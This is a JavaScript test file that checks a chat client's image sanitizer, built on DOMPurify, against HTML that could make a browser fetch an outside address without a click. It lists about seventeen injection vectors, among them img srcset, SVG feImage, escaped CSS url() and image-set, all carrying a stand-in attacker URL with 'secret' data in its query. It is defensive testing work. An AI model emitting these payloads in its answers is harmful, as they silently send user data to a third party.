// Runs CoreAIImages.sanitize against the real DOMPurify (in jsdom), for every way an answer's HTML can make the browser
// fetch an address without a click: <img>, <picture><source>, <video poster>, <audio>, <input type=image>, a table's
// background attribute, SVG images and CSS url(). image-allowlist.test.js covers the rules with a fake sanitizer; this
// file is the one that can see what the real one lets through.
//
// Run with: node --test tests/realtime-client/image-sanitizer.test.js
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

const assetsDirectory = path.join(__dirname, '../../src/Resources/CrestApps.AI.Resources/Assets/js');
const PAGE = 'https://chat.example.test/chat';
const LEAK = 'https://attacker.example/p?d=secret';

function createSanitizer(allowedHosts = []) {
    const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: PAGE });
    const purify = createDOMPurify(dom.window);
    const sandbox = { window: { location: dom.window.location }, document: dom.window.document, URL };

    vm.runInNewContext(fs.readFileSync(path.join(assetsDirectory, 'chat-markers.js'), 'utf8'), sandbox);

    return {
        dom,
        sanitize(html) {
            // The same configuration the two chat clients pass.
            return sandbox.window.CoreAIImages.sanitize(purify, html, { ADD_TAGS: ['canvas'], ADD_ATTR: ['target'] }, { allowedHosts, baseUrl: PAGE });
        }
    };
}

// Every element, attribute and CSS value in the result that could make the browser request the leak address.
function fetchersOf(dom, html) {
    const template = dom.window.document.createElement('div');
    template.innerHTML = html;

    const found = [];

    for (const element of template.querySelectorAll('*')) {
        for (const attribute of element.attributes) {
            if (!attribute.value.includes('attacker.example')) {
                continue;
            }

            // The link an image is turned into is the one place the address may stay, and it needs a click.
            if (element.tagName === 'A' && attribute.name === 'href') {
                continue;
            }

            found.push(`${element.tagName.toLowerCase()}[${attribute.name}]`);
        }
    }

    return found;
}

const vectors = {
    'img': `<img src="${LEAK}" alt="x">`,
    'img srcset': `<img src="/ok.png" srcset="${LEAK} 2x">`,
    'picture source': `<picture><source srcset="${LEAK}"><img src="/ok.png"></picture>`,
    'video poster': `<video poster="${LEAK}"></video>`,
    'video src': `<video src="${LEAK}"></video>`,
    'audio src': `<audio src="${LEAK}" autoplay></audio>`,
    'input image': `<input type="image" src="${LEAK}">`,
    'table cell background': `<table><tr><td background="${LEAK}">x</td></tr></table>`,
    'svg image': `<svg><image href="${LEAK}"></image></svg>`,
    'svg feImage': `<svg><filter><feImage href="${LEAK}"></feImage></filter></svg>`,
    'css background url': `<div style="background:url(${LEAK})">x</div>`,
    'css escaped url': `<div style="background:u\\72l(${LEAK})">x</div>`,
    'css image-set': `<div style="background-image:image-set('${LEAK}' 1x)">x</div>`,
    'css list-style': `<ul style="list-style-image:url(${LEAK})"><li>x</li></ul>`,
    'css content': `<p style="content:url(${LEAK})">x</p>`,
    'track': `<video><track src="${LEAK}"></video>`,
    'math': `<math><mglyph src="${LEAK}"></mglyph></math>`
};

for (const [name, html] of Object.entries(vectors)) {
    test(`a ${name} cannot make the browser request another site`, () => {
        const { dom, sanitize } = createSanitizer();

        assert.deepStrictEqual(fetchersOf(dom, sanitize(html)), []);
    });
}

test('an image from the page itself, and the size style the chat gives its images, stay', () => {
    const { sanitize } = createSanitizer();
    const result = sanitize('<img src="/figures/1.png" alt="f" class="img-thumbnail" style="max-width: 400px; height: auto;">');

    assert.match(result, /<img [^>]*src="\/figures\/1\.png"/);
    assert.match(result, /style="max-width: 400px; height: auto;"/);
});

test('an image from an allowlisted host stays', () => {
    const { sanitize } = createSanitizer(['images.example.test']);

    assert.match(sanitize('<img src="https://images.example.test/a.png">'), /<img [^>]*src="https:\/\/images\.example\.test\/a\.png"/);
});

test('data images stay', () => {
    const { sanitize } = createSanitizer();

    assert.match(sanitize('<img src="data:image/png;base64,iVBORw0KGgo=">'), /<img [^>]*src="data:image\/png/);
});

test('the answer keeps its text, links, tables and code', () => {
    const { sanitize } = createSanitizer();
    const result = sanitize('<p>hi <a href="https://example.test/x" target="_blank">link</a></p><table><tr><td>cell</td></tr></table><pre><code>x</code></pre>');

    assert.match(result, /hi <a href="https:\/\/example\.test\/x"/);
    assert.match(result, /<td>cell<\/td>/);
    assert.match(result, /<code>x<\/code>/);
});

test('a refused image becomes a link that shows its text', () => {
    const { sanitize } = createSanitizer();
    const result = sanitize(`<img src="${LEAK}" alt="the chart">`);

    assert.match(result, /<a href="https:\/\/attacker\.example\/p\?d=secret"[^>]*>the chart<\/a>/);
    assert.ok(!result.includes('<img'));
});

test('a relative address is judged against the page, so a same-origin image stays', () => {
    const { sanitize } = createSanitizer();

    assert.match(sanitize('<img src="relative/figure.png">'), /<img /);
});

// What marked writes for "- [ ] todo" and "- [x] done". Forbidding every <input> removed them.
test('Markdown task-list checkboxes stay', () => {
    const { sanitize } = createSanitizer();
    const result = sanitize('<ul><li><input disabled="" type="checkbox"> todo</li><li><input checked="" disabled="" type="checkbox"> done</li></ul>');

    assert.strictEqual((result.match(/<input /g) || []).length, 2);
    assert.match(result, /type="checkbox"/);
    assert.match(result, /checked=""/);
});

test('a checkbox cannot carry an address, and any other input is removed', () => {
    const { dom, sanitize } = createSanitizer();

    assert.deepStrictEqual(fetchersOf(dom, sanitize(`<input type="checkbox" src="${LEAK}" formaction="${LEAK}">`)), []);
    assert.ok(!sanitize(`<input type="image" src="${LEAK}">`).includes('<input'));
    assert.ok(!sanitize('<input type="text" value="x">').includes('<input'));
    assert.ok(!sanitize('<input>').includes('<input'));
});
